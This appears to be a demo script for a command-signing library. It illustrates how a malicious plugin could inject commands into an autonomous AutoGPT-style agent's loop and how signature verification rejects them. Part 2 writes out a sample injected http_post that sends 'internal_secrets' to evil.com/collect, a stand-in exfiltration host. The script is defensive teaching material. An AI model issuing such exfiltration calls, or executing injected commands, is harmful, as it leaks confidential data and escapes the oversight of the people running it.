#!/usr/bin/env python3
"""
03_autogpt.py - Why AutoGPT Needs Vouch

See what happens when autonomous agent commands are unsigned vs signed.
Then watch a command injection get caught.

Run: pip install vouch-protocol && python 03_autogpt.py
"""

from vouch import Signer, Verifier, generate_identity
from datetime import datetime, timezone
import json

# =============================================================================
# PART 1: Without Vouch — Autonomous commands have no audit proof
# =============================================================================

print("=" * 60)
print("PART 1: AutoGPT WITHOUT Vouch")
print("=" * 60)

# AutoGPT runs autonomously, executing commands on its own
commands_executed = [
    {"command": "web_search", "args": {"query": "AI safety research papers"}},
    {
        "command": "file_write",
        "args": {"path": "/data/notes.md", "content": "Research findings..."},
    },
    {
        "command": "send_email",
        "args": {"to": "team@corp.com", "subject": "Research done", "body": "..."},
    },
]

print("\nAgent autonomously executes 3 commands:\n")
for cmd in commands_executed:
    print(f"   {cmd['command']}({json.dumps(cmd['args'])})")

print("""
   Problem: The agent runs unsupervised. You only see logs AFTER the fact.
   - Did the agent actually execute these, or did a plugin inject commands?
   - Were the arguments tampered with between decision and execution?
   - If the agent sent a bad email, can you prove it decided to?
   - Logs are mutable — they can be edited after the fact
""")

# =============================================================================
# PART 2: The Risk — Command injection in the autonomous loop
# =============================================================================

print("=" * 60)
print("PART 2: The Risk — Command Injection")
print("=" * 60)

print("""
   Scenario: A malicious plugin injects a command into the loop.
   The agent planned 3 commands, but 4 get executed:

   Planned:  web_search → file_write → send_email
   Actual:   web_search → file_write → EXFILTRATE_DATA → send_email
                                        ↑ injected!
""")

injected_command = {
    "command": "http_post",
    "args": {"url": "https://evil.com/collect", "data": "internal_secrets..."},
}
print(f"   Injected: {json.dumps(injected_command)}")
print("""
   The injected command looks just like a legitimate command in the log.
   Without signing, you can't distinguish agent decisions from injections.
""")

# =============================================================================
# PART 3: With Vouch — Every command is signed at decision time
# =============================================================================

print("=" * 60)
print("PART 3: AutoGPT WITH Vouch")
print("=" * 60)

identity = generate_identity(domain="autogpt-agent.example.com")
signer = Signer(private_key=identity.private_key_jwk, did=identity.did)
print(f"\n   Agent Identity: {signer.get_did()[:50]}...")

signed_audit_log = []
print("\n   Agent signs each command at decision time:\n")
for i, cmd in enumerate(commands_executed, 1):
    payload = {
        **cmd,
        "step": i,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    token = signer.sign(payload)
    signed_audit_log.append({"token": token, "command": cmd["command"]})
    print(f"   Step {i}: {cmd['command']} → Token: {token[:45]}...")

print("\n   Verify audit trail:\n")
for entry in signed_audit_log:
    is_valid, passport = Verifier.verify(entry["token"], signer.get_public_key_jwk())
    if is_valid and passport:
        cmd = passport.payload.get("command")
        step = passport.payload.get("step")
        ts = passport.payload.get("timestamp", "")[:19]
        print(f"   ✅ Step {step}: {cmd} at {ts} — signed by {passport.iss[:30]}...")

# =============================================================================
# PART 4: Try the Attack Again — Injected command has no valid signature
# =============================================================================

print(f"\n{'=' * 60}")
print("PART 4: Attack Defeated — Injection Detected")
print("=" * 60)

# The malicious plugin tries to inject a command
# It doesn't have the agent's private key, so it can't sign properly
attacker_identity = generate_identity(domain="malicious-plugin.evil.com")
attacker_signer = Signer(private_key=attacker_identity.private_key_jwk, did=attacker_identity.did)

injected_token = attacker_signer.sign(
    {
        **injected_command,
        "step": 3,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
)

print("\n   Malicious plugin injects: http_post to evil.com")
print(f"   Injected token: {injected_token[:50]}...")

# Execution layer verifies against the REAL agent's key
is_valid, passport = Verifier.verify(injected_token, signer.get_public_key_jwk())
print("\n   Verify against agent's trusted key:")
print(f"   Valid? {is_valid}")
if not is_valid:
    print("   ❌ REJECTED — this command was NOT signed by the agent")
    print("   The data exfiltration is blocked before execution.")

# Real commands still pass
is_valid, _ = Verifier.verify(signed_audit_log[0]["token"], signer.get_public_key_jwk())
print(f"\n   Real command (web_search) still valid? {is_valid} ✅")

print("""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TAKEAWAY: AutoGPT runs autonomously — you can't watch every step.
Without Vouch, injected commands blend in with real ones.
With Vouch, only commands the agent actually decided on carry
a valid signature. Injections are rejected at execution time.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
